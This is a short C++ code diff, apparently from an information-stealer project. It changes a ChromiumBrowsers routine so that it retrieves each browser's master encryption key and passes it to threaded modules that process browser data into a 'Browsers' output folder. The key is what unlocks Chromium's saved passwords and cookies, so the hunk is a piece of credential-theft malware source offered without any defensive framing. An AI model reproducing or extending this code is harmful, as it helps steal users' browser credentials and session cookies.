@@ -45,11 +45,18 @@ void ChromiumBrowsers::execute(fs::path &root) {
             std::vector<std::thread> moduleThreads;
 
             fs::path browserRoot = root / "Browsers" / browser.first;
-            for(BrowserModule* module : this->modules)
+
+            std::vector<BYTE> master_key = ChromiumUtil::getMasterKey(browser.second);
+
+            if(master_key.empty())
+                return;
+
+            for(ChromiumBrowserModule* module : this->modules)
             {
-                moduleThreads.emplace_back([module, &browser, &browserRoot]() {
+                moduleThreads.emplace_back([module, &browser, &browserRoot, &master_key]() {
                     try
                     {
+                        module->setMasterKey(master_key);
                         module->execute(browserRoot, browser.first, browser.second);
                     }
                     catch (const std::exception& e)
